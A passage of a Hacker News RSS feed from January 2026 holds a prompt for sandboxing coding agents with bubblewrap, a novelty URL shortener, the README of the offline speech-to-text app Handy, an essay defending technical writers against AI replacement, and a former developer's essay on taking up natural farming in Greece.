    &lt;code&gt;claude "Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they're going to be invoked under my account's permissions.  Let's talk through everything that the agent should be able to do &amp;amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let's discuss what access we should restrict."&lt;/code&gt;
    &lt;p&gt;Need help on topics related to this? I’m currently freelance! Let’s connect and build secure things at incredibly high speed:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46626836</guid><pubDate>Thu, 15 Jan 2026 01:45:22 +0000</pubDate></item><item><title>The URL shortener that makes your links look as suspicious as possible</title><link>https://creepylink.com/</link><description>&lt;doc fingerprint="5aac401b9dd45eea"&gt;
  &lt;main&gt;
    &lt;p&gt;The URL shortener that makes your links look as suspicious as possible.&lt;/p&gt;
    &lt;p&gt;Normal links are too trustworthy. Make them creepy.&lt;/p&gt;
    &lt;p&gt;Your suspiciously shortened URL:&lt;/p&gt;
    &lt;p&gt;Copied to clipboard!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46627652</guid><pubDate>Thu, 15 Jan 2026 03:28:20 +0000</pubDate></item><item><title>Handy – Free open source speech-to-text app</title><link>https://github.com/cjpais/Handy</link><description>&lt;doc fingerprint="d43bde7e4d379f86"&gt;
  &lt;main&gt;
    &lt;p&gt;A free, open source, and extensible speech-to-text application that works completely offline.&lt;/p&gt;
    &lt;p&gt;Handy is a cross-platform desktop application built with Tauri (Rust + React/TypeScript) that provides simple, privacy-focused speech transcription. Press a shortcut, speak, and have your words appear in any text field—all without sending your voice to the cloud.&lt;/p&gt;
    &lt;p&gt;Handy was created to fill the gap for a truly open source, extensible speech-to-text tool. As stated on handy.computer:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Free: Accessibility tooling belongs in everyone's hands, not behind a paywall&lt;/item&gt;
      &lt;item&gt;Open Source: Together we can build further. Extend Handy for yourself and contribute to something bigger&lt;/item&gt;
      &lt;item&gt;Private: Your voice stays on your computer. Get transcriptions without sending audio to the cloud&lt;/item&gt;
      &lt;item&gt;Simple: One tool, one job. Transcribe what you say and put it into a text box&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Handy isn't trying to be the best speech-to-text app—it's trying to be the most forkable one.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Press a configurable keyboard shortcut to start/stop recording (or use push-to-talk mode)&lt;/item&gt;
      &lt;item&gt;Speak your words while the shortcut is active&lt;/item&gt;
      &lt;item&gt;Release and Handy processes your speech using Whisper&lt;/item&gt;
      &lt;item&gt;Get your transcribed text pasted directly into whatever app you're using&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The process is entirely local:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Silence is filtered using VAD (Voice Activity Detection) with Silero&lt;/item&gt;
      &lt;item&gt;Transcription uses your choice of models: &lt;list rend="ul"&gt;&lt;item&gt;Whisper models (Small/Medium/Turbo/Large) with GPU acceleration when available&lt;/item&gt;&lt;item&gt;Parakeet V3 - CPU-optimized model with excellent performance and automatic language detection&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Works on Windows, macOS, and Linux&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Download the latest release from the releases page or the website&lt;/item&gt;
      &lt;item&gt;Install the application following platform-specific instructions&lt;/item&gt;
      &lt;item&gt;Launch Handy and grant necessary system permissions (microphone, accessibility)&lt;/item&gt;
      &lt;item&gt;Configure your preferred keyboard shortcuts in Settings&lt;/item&gt;
      &lt;item&gt;Start transcribing!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For detailed build instructions including platform-specific requirements, see BUILD.md.&lt;/p&gt;
    &lt;p&gt;Handy is built as a Tauri application combining:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frontend: React + TypeScript with Tailwind CSS for the settings UI&lt;/item&gt;
      &lt;item&gt;Backend: Rust for system integration, audio processing, and ML inference&lt;/item&gt;
      &lt;item&gt;Core Libraries: &lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;whisper-rs&lt;/code&gt;: Local speech recognition with Whisper models&lt;/item&gt;&lt;item&gt;&lt;code&gt;transcription-rs&lt;/code&gt;: CPU-optimized speech recognition with Parakeet models&lt;/item&gt;&lt;item&gt;&lt;code&gt;cpal&lt;/code&gt;: Cross-platform audio I/O&lt;/item&gt;&lt;item&gt;&lt;code&gt;vad-rs&lt;/code&gt;: Voice Activity Detection&lt;/item&gt;&lt;item&gt;&lt;code&gt;rdev&lt;/code&gt;: Global keyboard shortcuts and system events&lt;/item&gt;&lt;item&gt;&lt;code&gt;rubato&lt;/code&gt;: Audio resampling&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Handy includes an advanced debug mode for development and troubleshooting. Access it by pressing:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS: &lt;code&gt;Cmd+Shift+D&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Windows/Linux: &lt;code&gt;Ctrl+Shift+D&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This project is actively being developed and has some known issues. We believe in transparency about the current state:&lt;/p&gt;
    &lt;p&gt;Whisper Model Crashes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Whisper models crash on certain system configurations (Windows and Linux)&lt;/item&gt;
      &lt;item&gt;Does not affect all systems - issue is configuration-dependent &lt;list rend="ul"&gt;&lt;item&gt;If you experience crashes and are a developer, please help to fix and provide debug logs!&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Wayland Support (Linux):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Limited support for Wayland display server&lt;/item&gt;
      &lt;item&gt;Requires &lt;code&gt;wtype&lt;/code&gt;or&lt;code&gt;dotool&lt;/code&gt;for text input to work correctly (see Linux Notes below for installation)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Text Input Tools:&lt;/p&gt;
    &lt;p&gt;For reliable text input on Linux, install the appropriate tool for your display server:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Display Server&lt;/cell&gt;
        &lt;cell role="head"&gt;Recommended Tool&lt;/cell&gt;
        &lt;cell role="head"&gt;Install Command&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;X11&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;xdotool&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;sudo apt install xdotool&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Wayland&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;wtype&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;sudo apt install wtype&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Both&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;dotool&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;&lt;code&gt;sudo apt install dotool&lt;/code&gt; (requires &lt;code&gt;input&lt;/code&gt; group)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;X11: Install &lt;code&gt;xdotool&lt;/code&gt;for both direct typing and clipboard paste shortcuts&lt;/item&gt;
      &lt;item&gt;Wayland: Install &lt;code&gt;wtype&lt;/code&gt;(preferred) or&lt;code&gt;dotool&lt;/code&gt;for text input to work correctly&lt;/item&gt;
      &lt;item&gt;dotool setup: Requires adding your user to the &lt;code&gt;input&lt;/code&gt;group:&lt;code&gt;sudo usermod -aG input $USER&lt;/code&gt;(then log out and back in)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Without these tools, Handy falls back to enigo which may have limited compatibility, especially on Wayland.&lt;/p&gt;
    &lt;p&gt;Other Notes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;The recording overlay is disabled by default on Linux (&lt;/p&gt;&lt;code&gt;Overlay Position: None&lt;/code&gt;) because certain compositors treat it as the active window. When the overlay is visible it can steal focus, which prevents Handy from pasting back into the application that triggered transcription. If you enable the overlay anyway, be aware that clipboard-based pasting might fail or end up in the wrong window.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;If you are having trouble with the app, running with the environment variable&lt;/p&gt;&lt;code&gt;WEBKIT_DISABLE_DMABUF_RENDERER=1&lt;/code&gt;may help&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;You can manage global shortcuts outside of Handy and still control the app via signals. Sending&lt;/p&gt;&lt;code&gt;SIGUSR2&lt;/code&gt;to the Handy process toggles recording on/off, which lets Wayland window managers or other hotkey daemons keep ownership of keybindings. Example (Sway):&lt;quote&gt;bindsym $mod+o exec pkill -USR2 -n handy&lt;/quote&gt;&lt;code&gt;pkill&lt;/code&gt;here simply delivers the signal—it does not terminate the process.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS (both Intel and Apple Silicon)&lt;/item&gt;
      &lt;item&gt;x64 Windows&lt;/item&gt;
      &lt;item&gt;x64 Linux&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The following are recommendations for running Handy on your own machine. If you don't meet the system requirements, the performance of the application may be degraded. We are working on improving the performance across all kinds of computers and hardware.&lt;/p&gt;
    &lt;p&gt;For Whisper Models:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS: M series Mac, Intel Mac&lt;/item&gt;
      &lt;item&gt;Windows: Intel, AMD, or NVIDIA GPU&lt;/item&gt;
      &lt;item&gt;Linux: Intel, AMD, or NVIDIA GPU &lt;list rend="ul"&gt;&lt;item&gt;Ubuntu 22.04, 24.04&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For Parakeet V3 Model:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;CPU-only operation - runs on a wide variety of hardware&lt;/item&gt;
      &lt;item&gt;Minimum: Intel Skylake (6th gen) or equivalent AMD processors&lt;/item&gt;
      &lt;item&gt;Performance: ~5x real-time speed on mid-range hardware (tested on i5)&lt;/item&gt;
      &lt;item&gt;Automatic language detection - no manual language selection required&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We're actively working on several features and improvements. Contributions and feedback are welcome!&lt;/p&gt;
    &lt;p&gt;Debug Logging:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Adding debug logging to a file to help diagnose issues&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;macOS Keyboard Improvements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Support for Globe key as transcription trigger&lt;/item&gt;
      &lt;item&gt;A rewrite of global shortcut handling for MacOS, and potentially other OS's too.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Opt-in Analytics:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Collect anonymous usage data to help improve Handy&lt;/item&gt;
      &lt;item&gt;Privacy-first approach with clear opt-in&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Settings Refactoring:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cleanup and refactor settings system which is becoming bloated and messy&lt;/item&gt;
      &lt;item&gt;Implement better abstractions for settings management&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Tauri Commands Cleanup:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Abstract and organize Tauri command patterns&lt;/item&gt;
      &lt;item&gt;Investigate tauri-specta for improved type safety and organization&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you're behind a proxy, firewall, or in a restricted network environment where Handy cannot download models automatically, you can manually download and install them. The URLs are publicly accessible from any browser.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Open Handy settings&lt;/item&gt;
      &lt;item&gt;Navigate to the About section&lt;/item&gt;
      &lt;item&gt;Copy the "App Data Directory" path shown there, or use the shortcuts: &lt;list rend="ul"&gt;&lt;item&gt;macOS: &lt;code&gt;Cmd+Shift+D&lt;/code&gt;to open debug menu&lt;/item&gt;&lt;item&gt;Windows/Linux: &lt;code&gt;Ctrl+Shift+D&lt;/code&gt;to open debug menu&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;macOS: &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The typical paths are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS: &lt;code&gt;~/Library/Application Support/com.pais.handy/&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Windows: &lt;code&gt;C:\Users\{username}\AppData\Roaming\com.pais.handy\&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Linux: &lt;code&gt;~/.config/com.pais.handy/&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Inside your app data directory, create a &lt;code&gt;models&lt;/code&gt; folder if it doesn't already exist:&lt;/p&gt;
    &lt;code&gt;# macOS/Linux
mkdir -p ~/Library/Application\ Support/com.pais.handy/models

# Windows (PowerShell)
New-Item -ItemType Directory -Force -Path "$env:APPDATA\com.pais.handy\models"&lt;/code&gt;
    &lt;p&gt;Download the models you want from below&lt;/p&gt;
    &lt;p&gt;Whisper Models (single .bin files):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Small (487 MB): &lt;code&gt;https://blob.handy.computer/ggml-small.bin&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Medium (492 MB): &lt;code&gt;https://blob.handy.computer/whisper-medium-q4_1.bin&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Turbo (1600 MB): &lt;code&gt;https://blob.handy.computer/ggml-large-v3-turbo.bin&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Large (1100 MB): &lt;code&gt;https://blob.handy.computer/ggml-large-v3-q5_0.bin&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Parakeet Models (compressed archives):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;V2 (473 MB): &lt;code&gt;https://blob.handy.computer/parakeet-v2-int8.tar.gz&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;V3 (478 MB): &lt;code&gt;https://blob.handy.computer/parakeet-v3-int8.tar.gz&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For Whisper Models (.bin files):&lt;/p&gt;
    &lt;p&gt;Simply place the &lt;code&gt;.bin&lt;/code&gt; file directly into the &lt;code&gt;models&lt;/code&gt; directory:&lt;/p&gt;
    &lt;code&gt;{app_data_dir}/models/
├── ggml-small.bin
├── whisper-medium-q4_1.bin
├── ggml-large-v3-turbo.bin
└── ggml-large-v3-q5_0.bin
&lt;/code&gt;
    &lt;p&gt;For Parakeet Models (.tar.gz archives):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Extract the &lt;code&gt;.tar.gz&lt;/code&gt;file&lt;/item&gt;
      &lt;item&gt;Place the extracted directory into the &lt;code&gt;models&lt;/code&gt;folder&lt;/item&gt;
      &lt;item&gt;The directory must be named exactly as follows: &lt;list rend="ul"&gt;&lt;item&gt;Parakeet V2: &lt;code&gt;parakeet-tdt-0.6b-v2-int8&lt;/code&gt;&lt;/item&gt;&lt;item&gt;Parakeet V3: &lt;code&gt;parakeet-tdt-0.6b-v3-int8&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Parakeet V2: &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Final structure should look like:&lt;/p&gt;
    &lt;code&gt;{app_data_dir}/models/
├── parakeet-tdt-0.6b-v2-int8/     (directory with model files inside)
│   ├── (model files)
│   └── (config files)
└── parakeet-tdt-0.6b-v3-int8/     (directory with model files inside)
    ├── (model files)
    └── (config files)
&lt;/code&gt;
    &lt;p&gt;Important Notes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For Parakeet models, the extracted directory name must match exactly as shown above&lt;/item&gt;
      &lt;item&gt;Do not rename the &lt;code&gt;.bin&lt;/code&gt;files for Whisper models—use the exact filenames from the download URLs&lt;/item&gt;
      &lt;item&gt;After placing the files, restart Handy to detect the new models&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Restart Handy&lt;/item&gt;
      &lt;item&gt;Open Settings → Models&lt;/item&gt;
      &lt;item&gt;Your manually installed models should now appear as "Downloaded"&lt;/item&gt;
      &lt;item&gt;Select the model you want to use and test transcription&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Check existing issues at github.com/cjpais/Handy/issues&lt;/item&gt;
      &lt;item&gt;Fork the repository and create a feature branch&lt;/item&gt;
      &lt;item&gt;Test thoroughly on your target platform&lt;/item&gt;
      &lt;item&gt;Submit a pull request with clear description of changes&lt;/item&gt;
      &lt;item&gt;Join the discussion - reach out at contact@handy.computer&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The goal is to create both a useful tool and a foundation for others to build upon—a well-patterned, simple codebase that serves the community.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Handy CLI - The original Python command-line version&lt;/item&gt;
      &lt;item&gt;handy.computer - Project website with demos and documentation&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;MIT License - see LICENSE file for details.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Whisper by OpenAI for the speech recognition model&lt;/item&gt;
      &lt;item&gt;whisper.cpp and ggml for amazing cross-platform whisper inference/acceleration&lt;/item&gt;
      &lt;item&gt;Silero for great lightweight VAD&lt;/item&gt;
      &lt;item&gt;Tauri team for the excellent Rust-based app framework&lt;/item&gt;
      &lt;item&gt;Community contributors helping make Handy better&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;"Your search for the right speech-to-text tool can end here—not because Handy is perfect, but because you can make it perfect for you."&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46628397</guid><pubDate>Thu, 15 Jan 2026 05:23:18 +0000</pubDate></item><item><title>A letter to those who fired tech writers because of AI</title><link>https://passo.uno/letter-those-who-fired-tech-writers-ai/</link><description>&lt;doc fingerprint="a52051962f092c01"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;To those who fired or didn't hire tech writers because of AI&lt;/head&gt;
    &lt;p&gt;Hey you,&lt;/p&gt;
    &lt;p&gt;Yes, you, who are thinking about not hiring a technical writer this year or, worse, erased one or more technical writing positions last year because of AI. You, who are buying into the promise of docs entirely authored by LLMs without expert oversight or guidance. You, who unloaded the weight of docs on your devs’ shoulders, as if it was a trivial chore.&lt;/p&gt;
    &lt;p&gt;You are making a big mistake. But you can still undo the damage.&lt;/p&gt;
    &lt;p&gt;It’s been a complicated year, 2025. When even Andrej Karpathy, one of OpenAI’s founders, admits, in a fit of Oppenheimerian guilt, to feeling lost, you know that no one holds the key to the future. You flail and dance around these new totems made of words, which are neither intelligent nor conscious, pretending they can replace humans while, in fact, they’re little more than glorified tools.&lt;/p&gt;
    &lt;p&gt;You might think that the plausible taste of AI prose is all you need to give your products a voice. You paste code into a field and something that resembles docs comes out after a few minutes. Like a student eager to turn homework in, you might be tempted to content yourself with docs theatre, thinking that it’ll earn you a good grade. It won’t, because docs aren’t just artifacts.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;You keep using that word. I do not think it means what you think it means&lt;/p&gt;
      &lt;p&gt;—The Princess Bride&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;When you say “docs”, you’re careful to focus on the output, omitting the process. Perhaps you don’t know how docs are produced. You’ve forgotten, or perhaps never knew, that docs are product truth; that without them, software becomes unusable, because software is never done, is never obvious, and is never simple. Producing those docs requires tech writers.&lt;/p&gt;
    &lt;p&gt;Tech writers go to great lengths to get the information they need. They write so that your audience can understand. They hunger for clarity and meaning and impact. They power through weeks full of deadlines, chasing product news, because without their reporting, most products wouldn’t thrive; some wouldn’t even exist. Their docs aren’t a byproduct: they tie the product together.&lt;/p&gt;
    &lt;p&gt;An LLM can’t do all that, because it can’t feel the pain of your users. It can’t put itself into their shoes. It lacks the kind of empathy that’s behind great help content. It does not, in fact, have any empathy at all, because it cannot care. You need folks who will care, because content is a hairy beast that can only be tamed by agents made of flesh and capable of emotions: humans.&lt;/p&gt;
    &lt;head rend="h2"&gt;AI generated docs are broken&lt;/head&gt;
    &lt;p&gt;You can’t generate docs on autopilot. Let me tell you why.&lt;/p&gt;
    &lt;p&gt;First, AI-generated docs are not intelligent. They not only make up things in subtle ways: They lack vision. Even if you fed them millions of tokens, they couldn’t develop a docs strategy, decide what not to document, or structure content for reuse. And they fail to capture the tension, the caveats, the edge cases, the feeling of unfinishedness that only someone who cares can feel. Without that grounding, docs are hollow.&lt;/p&gt;
    &lt;p&gt;Second, liability doesn’t vanish just because AI wrote it. When docs cause harm through wrong instructions, someone will be held responsible. It won’t be the model. You can’t depose an LLM. You can’t fire it. You can’t point at it in court when a customer’s data evaporates because your GenAI runbook told them to run the wrong command. That someone will be you, or someone who reports to you.&lt;/p&gt;
    &lt;p&gt;Third, even your favorite AI must RTFM. All your Claude Skills, Cursor rules, all the semantic tagging that makes RAG work, is technical writing under a new name: context curation. You fired or didn’t hire the people who create high-quality context and then wondered why your AI tools produce slop. You can’t augment what isn’t there. The writers you let go were the supply chain for the intelligence you’re now betting on.&lt;/p&gt;
    &lt;head rend="h2"&gt;The solution is to augment your technical writers&lt;/head&gt;
    &lt;p&gt;It’s not all bad news: Marvelous things can happen if you provide your writers with AI tools and training while you protect the quality of your content through an AI policy. I’ve described the ideal end state in My day as an augmented technical writer in 2030, a vision of the future where writers orchestrate, edit, and publish docs together with AI agents. This is already happening before our eyes.&lt;/p&gt;
    &lt;p&gt;Productivity gains are real when you understand that augmentation is better than replacing humans, a reality even AWS’ CEO, Matt Garman, acknowledged. Read how I’m using AI as a technical writer. I’m not alone: Follow Tom Johnson, CT Smith, and Sarah Deaton, and discover how tech writers are building tools through AI to better apply it to docs.&lt;/p&gt;
    &lt;p&gt;Develop an AI strategy for docs together with tech writers, and give them time and resources to experiment with AI. Tech writers are resourceful by nature: they’ve spent careers doing more with less, optimizing workflows, finding clever solutions to impossible quests. Give them the tools and a bit of runway, and they’ll figure out how to make AI work for the docs, not instead of them.&lt;/p&gt;
    &lt;head rend="h2"&gt;So here’s my request for you: Reconsider&lt;/head&gt;
    &lt;p&gt;Reconsider the positions you did not open. Or the writers you let go. Reconsider the assumption that AI has solved a problem that, at its core, is deeply human and requires not only concatenating words, but also chasing subject-matter experts and understanding the subtleties of product motions, among many other things.&lt;/p&gt;
    &lt;p&gt;Technical writers aren’t a luxury. They are the people who translate what you’ve built into something others can use. Without them, you’re shipping a product that can’t speak for itself, or that lies. Your product needs to speak. AI can generate noise effectively and infinitely, but only a technical writer can create the signal.&lt;/p&gt;
    &lt;p&gt;Don’t choose the noise. Get them back. Get them onboard.&lt;/p&gt;
    &lt;head rend="h3"&gt;Acknowledgments&lt;/head&gt;
    &lt;p&gt;Thanks to Tiffany Hrabusa, Casey Smith, and Anna Urbiztondo for their reviews of early drafts and for their encouragement. Thanks to my partner, Valentina, for helping me improve this piece and for suggesting to wait a bit before hitting Publish. And a heartfelt thank you to the tech writing community and its wonderful human beings.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46629474</guid><pubDate>Thu, 15 Jan 2026 07:58:23 +0000</pubDate></item><item><title>Have Taken Up Farming</title><link>https://dylan.gr/1768295794</link><description>&lt;doc fingerprint="525057051f08529a"&gt;
  &lt;main&gt;
    &lt;p&gt;&lt;lb/&gt;Disclaimer: These are my personal views and do not represent any organization or professional advice.&lt;/p&gt;
    &lt;p&gt;#life&lt;/p&gt;
    &lt;p&gt;Tue, 13 Jan 2026 11:16:34 +0200&lt;/p&gt;
    &lt;p&gt;HAVE TAKEN UP FARMING&lt;/p&gt;
    &lt;p&gt;My name is Dylan Araps and I used to be a software engineer, best known for my open source work (Neofetch, Pywal, KISS Linux, Pure Bash Bible) [0]. In 2021, without explanation and without telling anyone, I vanished from the internet. My usage of the internet became strictly "read only".&lt;/p&gt;
    &lt;p&gt;In 2024, I appeared briefly to tell the world I retired and had "taken up farming" [1]. The vagueness of my message and strangeness surrounding its circumstances created a lot of buzz. It is not every day a person in a cushy, intellectual career drops everything and pivots to working outdoors with their body. It was amusing to read the theories people came up with: from driving a tractor up and down massive tracts of land to being holed up in a Kaczynskiesque cabin in the woods.&lt;/p&gt;
    &lt;p&gt;Today, I return to the internet to tell my story and announce https://WILD.gr.&lt;/p&gt;
    &lt;p&gt;For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.&lt;/p&gt;
    &lt;p&gt;This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.&lt;/p&gt;
    &lt;p&gt;In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.&lt;/p&gt;
    &lt;p&gt;This culminated in an existential crisis where I asked myself: "What am I doing with my life?". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.&lt;/p&gt;
    &lt;p&gt;Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.&lt;/p&gt;
    &lt;p&gt;Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.&lt;/p&gt;
    &lt;p&gt;Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.&lt;/p&gt;
    &lt;p&gt;At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.&lt;/p&gt;
    &lt;p&gt;I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.&lt;/p&gt;
    &lt;p&gt;No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.&lt;/p&gt;
    &lt;p&gt;For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eating everything. I ate figs for the first time and then proceeded to make up for all the years spent not eating them.&lt;/p&gt;
    &lt;p&gt;From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.&lt;/p&gt;
    &lt;p&gt;As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.&lt;/p&gt;
    &lt;p&gt;I chose the path of farmer and to be more precise, "Natural Farmer". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.&lt;/p&gt;
    &lt;p&gt;When I said "have taken up farming" [1]. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome to https://WILD.gr.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
